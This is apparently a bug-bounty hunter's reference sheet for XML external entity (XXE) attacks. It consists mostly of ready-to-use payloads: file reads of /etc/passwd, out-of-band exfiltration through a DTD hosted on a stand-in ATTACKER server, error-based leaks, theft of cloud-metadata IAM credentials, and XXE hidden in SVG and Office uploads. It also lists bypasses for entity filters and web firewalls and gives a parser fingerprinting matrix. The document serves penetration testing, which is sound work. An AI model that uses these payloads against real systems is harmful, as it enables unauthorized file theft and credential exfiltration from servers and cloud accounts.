# XXE — payload reference

> Class: file-read / SSRF / blind-OOB / (rarely) RCE via XML external entities. Trigger: any XML/SOAP
> endpoint, upload-and-parse (SVG/DOCX/XLSX/PPTX), a SAML ACS, RSS/feed/sitemap, a JSON API that silently
> accepts `Content-Type: application/xml`. **Pre-severity gate:** first an inline probe
> `<!ENTITY hello "world!">` + `&hello;` — if `world!` is NOT reflected, entity expansion is off and SYSTEM
> won't work either → don't burn cycles on a hardened parser.

## Payloads

- **Classic in-band file-read**:
  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;
  </data></root>`. Windows: `file:///C:/Windows/win.ini`.
  - Detection Signal: the file content (`root:x:0:0:` / `[fonts]`) reflected in the response body.
- **Blind OOB — external-DTD callback (parameter-entity)**: when there is no reflection. In the body:
  `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM
  "http://ATTACKER/evil.dtd"> %dtd;]>`. On your server `evil.dtd`:
  `<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER/?data=%file;'>"> %all;`.
  - Detection Signal: an OOB hit on your server/Collaborator with the content of `/etc/passwd` in the query
    string. (The `%` indirection is mandatory — a general entity does not expand in an external context.)
- **Error-based exfiltration (egress is closed)**: make the parser throw an error with the file content:
  `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error
  SYSTEM 'file:///notexist/%file;'>"> %eval; %error;]>`.
  - Detection Signal: the parser error message in the response contains a path with the interpolated file content.
- **SSRF via XXE (internal / cloud-metadata)**:
  `<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-
  credentials/">]><root><data>&ssrf;</data></root>`. GCP: `http://metadata.google.internal/
  computeMetadata/v1/` (needs a header, if the parser sends it — often it doesn't → try internal hosts).
  - Detection Signal: the IMDS JSON / the body of an internal service in the response, OR an OOB hit on a
    blind target.
- **XXE in an SVG upload**:
  `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
  <svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>` — upload to an
  avatar/thumbnail endpoint.
  - Detection Signal: the file content rendered in the SVG preview / response (Zivver-class → SSRF).
- **XXE in DOCX/XLSX/PPTX** (OOXML = a ZIP of XML): unzip, insert into `word/document.xml` /
  `ppt/slides/slide1.xml` / `[Content_Types].xml`:
  `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://ATTACKER/d.dtd"> %a;]>`, rezip, upload to the
  import/convert feature. Usually blind OOB (Open-Xchange PPTX class).
  - Detection Signal: an OOB hit on document processing + exfiltration via the DTD callback.
- **Parameter-entity (bypass an `ENTITY` blacklist / DOCTYPE filters)**:
  `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER"> %xxe;]>`; case variation
  `<!DoCtYpE foo [<!EnTiTy ...>]>`; UTF-16 encoding of the whole payload; a nested char-ref
  `&#x66;&#x69;&#x6c;&#x65;:///etc/passwd`.
  - Detection Signal: OOB/file-read works where a direct `SYSTEM` was blocked by a WAF/blacklist.
- **Alt-schemes when `file://` is blocked**:
  `php://filter/convert.base64-encode/resource=/etc/passwd` (PHP, binary-safe),
  `netdoc:///etc/passwd` / `jar:file:///etc/passwd!/` (Java),
  `gopher://internal:80/_GET%20/` (SSRF into Redis/SMTP). XInclude when DOCTYPE is forbidden:
  `<xi:include href="file:///etc/passwd" parse="text"/>` with `xmlns:xi`.
  - Detection Signal: base64/file content in the response via the alt-scheme.

## Fingerprint before hunting (parser matrix, saves time)

The classics are not universal in 2026. **Java SAX/DOM/JAXB (Tomcat/`X-Powered-By: Servlet`)**, **PHP
`DOMDocument`/`simplexml` with `LIBXML_NOENT`**, **old Nokogiri with `DTDLOAD`**, **legacy IIS SOAP**,
**embedded/IoT** — YES. **Python `lxml`/`ElementTree`/`minidom`, `defusedxml`, modern Nokogiri,
.NET (`DtdProcessing.Prohibit` by default)** — safe. Fingerprint the stack first, then the inline probe.

## Anti-FP / what NOT to submit on its own

- **Blind OOB DNS-only without exfiltration** = Low/Medium (info: "the parser fetches entities"), NOT Critical.
  Critical requires PROVEN file-read or internal-HTTP — show the actual `/etc/passwd` / IMDS JSON in the report.
- **Billion-laughs / exponential-entity-expansion** — this is **DoS**, mark it **OUT OF SCOPE** (our policy:
  no DoS). Mention only as "the parser does not limit entities", do not exploit.
- **SVG-XXE on a hardened thumbnailer** — the inline probe first, do not assume from `.svg` acceptance.
- **SAML-assertion XXE** — see `saml.md` (a separate layer on top of XSW).
